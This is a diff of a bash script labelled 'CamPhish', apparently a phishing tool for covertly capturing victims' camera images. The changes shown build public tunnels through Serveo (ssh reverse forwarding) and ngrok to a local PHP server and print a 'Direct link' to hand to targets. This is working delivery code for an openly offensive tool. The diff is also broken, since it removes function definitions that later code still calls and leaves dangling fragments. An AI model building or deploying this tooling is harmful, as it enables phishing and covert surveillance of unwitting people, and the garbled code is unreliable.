@@ -2,36 +2,46 @@
 # CamPhish v1.7
 # Powered by Irsyah
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
+server() {
 
-trap 'printf "\n";stop' 2
+has_cmd ssh || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-# Platform detection
-PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
-IS_DARWIN=false
-IS_LINUX=false
-IS_TERMUX=false
-IS_WINDOWS=false
-case "$PLATFORM" in
-	Darwin*) IS_DARWIN=true ;; 
-	Linux*) 
-		IS_LINUX=true
-		# detect Termux (Android) by presence of /data/data/com.termux
-		if [ -d "/data/data/com.termux" ] || [ -n "$PREFIX" -a "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
-			IS_TERMUX=true
-		fi
-		;;
-	MINGW*|MSYS*|CYGWIN*) IS_WINDOWS=true ;; 
-	*) ;;
-esac
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo Sever Hatinya...\e[0m\n"
 
-# Portable check for command
-has_cmd() { command -v "$1" >/dev/null 2>&1; }
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1 || true
+fi
 
-# Kill processes listening on a port (portable across fuser/lsof/netstat)
-kill_port() {
-	port="$1"
-	if has_cmd fuser; then
-		fuser -k ${port}/tcp > /dev/null 2>&1 || true
+if [[ $subdomain_resp == true ]]; then
+	$(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1" &
+	sleep 10
+else
+	$(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1" &
+	sleep 10
+fi
+
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server Bukan PHP In Dia yehhh... (localhost:3333)\e[0m\n"
+kill_port 3333
+
+# Bind to 0.0.0.0 for mobile hotspots and when running on Windows/Termux so other devices can reach the PHP server
+PHP_BIND="127.0.0.1"
+if $IS_TERMUX || $IS_WINDOWS; then
+	PHP_BIND="0.0.0.0"
+fi
+
+# Start php and log output so users can inspect php.log
+php -S ${PHP_BIND}:3333 > php.log 2>&1 &
+sleep 3
+
+# extract serveo url (match common Serveo output variants) and set link for downstream use
+send_link=$(grep -o "https://[0-9A-Za-z._-]*\\.serveo.net" sendlink | head -n1 || true)
+if [[ -z "$send_link" ]]; then
+	send_link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+fi
+link="$send_link"
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "${link:-(none)}"
+
+}
 		return
 	fi
 	if has_cmd lsof; then
@@ -325,63 +335,72 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (localhost:3333)...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 
-# Choose ngrok executable: prefer local ./ngrok, otherwise system ngrok
-if [[ -x "./ngrok" ]]; then
+# Choose ngrok executable: prefer ngrok.exe on Windows, then local ./ngrok, then system ngrok
+NGROK_CMD=""
+if $IS_WINDOWS && [[ -x ./ngrok.exe ]]; then
+	NGROK_CMD="./ngrok.exe"
+elif [[ -x ./ngrok ]]; then
 	NGROK_CMD="./ngrok"
 elif has_cmd ngrok; then
 	NGROK_CMD="ngrok"
-else
-	NGROK_CMD=""
 fi
 
 if [[ -n "$NGROK_CMD" ]]; then
-	printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel using %s...\n" "$NGROK_CMD"
-	$NGROK_CMD http 3333 > /dev/null 2>&1 &
-	# Poll ngrok local API for a public url (up to 20s)
+	printf "\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;92m] Starting ngrok tunnel using %s...\n" "$NGROK_CMD"
+	# start ngrok and capture its output to ngrok.log for debugging
+	# On Windows, try to use PowerShell Start-Process if available to detach cleanly
+	if $IS_WINDOWS && [[ "$NGROK_CMD" == *"ngrok.exe"* ]] && has_cmd powershell; then
+		powershell -Command "Start-Process -FilePath '$(pwd)/ngrok.exe' -ArgumentList 'http 3333' -NoNewWindow" >/dev/null 2>&1 || true
+	else
+		$NGROK_CMD http 3333 > ngrok.log 2>&1 &
+	fi
+
+	# Poll ngrok local API for a public url (up to 40s)
 	link=""
 	attempts=0
-	until [[ -n "$link" || $attempts -ge 20 ]]; do
+	until [[ -n "$link" || $attempts -ge 40 ]]; do
 		sleep 1
-		# try to extract public_url field
 		api_json=$(curl -s --max-time 1 http://127.0.0.1:4040/api/tunnels 2>/dev/null || true)
 		if [[ -n "$api_json" ]]; then
-			# primary parse: look for public_url
 			link=$(echo "$api_json" | grep -o '"public_url":"https://[^\\\"]*' | head -n1 | cut -d'"' -f4 || true)
 			if [[ -z "$link" ]]; then
-				# fallback: any https url
 				link=$(echo "$api_json" | grep -o 'https://[^/\\\"]*' | head -n1 || true)
 			fi
 		fi
+		# as another fallback, scan ngrok.log for https lines
+		if [[ -f ngrok.log ]] && [[ -z "$link" ]]; then
+			link=$(grep -o 'https://[A-Za-z0-9.-]*ngrok[^ ]*' ngrok.log | head -n1 || true)
+		fi
 		attempts=$((attempts+1))
 	done
+
 	if [[ -n "$link" ]]; then
 		printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
 	else
-		printf "\e[1;31m[!] Ngrok did not return a public URL after polling.\e[0m\n"
+		printf "\e[1;31m[!] Ngrok did not return a public URL after polling. See ngrok.log for details.\e[0m\n"
 		printf "\e[1;92m[\e[0m*\e[1;92m] Possible reasons:\e[0m\n"
 		printf " - Ngrok failed to start or invalid authtoken\n"
 		printf " - Port 3333 is in use or blocked\n"
 		printf " - No internet connection or firewall\n"
-		# If there is a sendlink (serveo/ssh) output, show it for debugging
-		if [[ -f "sendlink" ]]; then
-			printf "\n\e[1;93m[Debug] Contents of sendlink (serveo/ssh output):\e[0m\n"
-			sed -n '1,120p' sendlink || true
+		if [[ -f "ngrok.log" ]]; then
+			printf "\n\e[1;93m[Debug] ngrok.log (first 120 lines):\e[0m\n"
+			sed -n '1,120p' ngrok.log || true
 			printf "\n"
-			# try to extract a serveo URL from sendlink
+		fi
+		# try to extract a serveo URL from sendlink as a last resort
+		if [[ -f "sendlink" ]]; then
 			serveo_url=$(grep -o 'https://[^ ]*serveo[^ ]*' sendlink | head -n1 || true)
 			if [[ -n "$serveo_url" ]]; then
 				printf "\e[1;92m[\e[0m*\e[1;92m] Serveo link detected:\e[0m\e[1;77m %s\e[0m\n" "$serveo_url"
 				link="$serveo_url"
 			fi
 		fi
-		# final fallback: fail with clear message
 		if [[ -z "$link" ]]; then
 			printf "\e[1;31m[!] Direct link generation failed. See above messages for troubleshooting.\e[0m\n"
 			exit 1
 		fi
 	fi
 else
-	# No ngrok binary; check if sendlink has serveo output
 	printf "\e[1;93m[!] ngrok executable not found. Falling back to Serveo output if present.\e[0m\n"
 	if [[ -f "sendlink" ]]; then
 		serveo_url=$(grep -o 'https://[^ ]*serveo[^ ]*' sendlink | head -n1 || true)
@@ -389,7 +408,6 @@ else
 			printf "\e[1;92m[\e[0m*\e[1;92m] Serveo link detected:\e[0m\e[1;77m %s\e[0m\n" "$serveo_url"
 			link="$serveo_url"
 		else
-			# try broader match (serveousercontent etc.)
 			serveo_url=$(grep -o 'https://[^ ]*serveousercontent[^ ]*' sendlink | head -n1 || true)
 			if [[ -n "$serveo_url" ]]; then
 				printf "\e[1;92m[\e[0m*\e[1;92m] Serveo content URL detected:\e[0m\e[1;77m %s\e[0m\n" "$serveo_url"
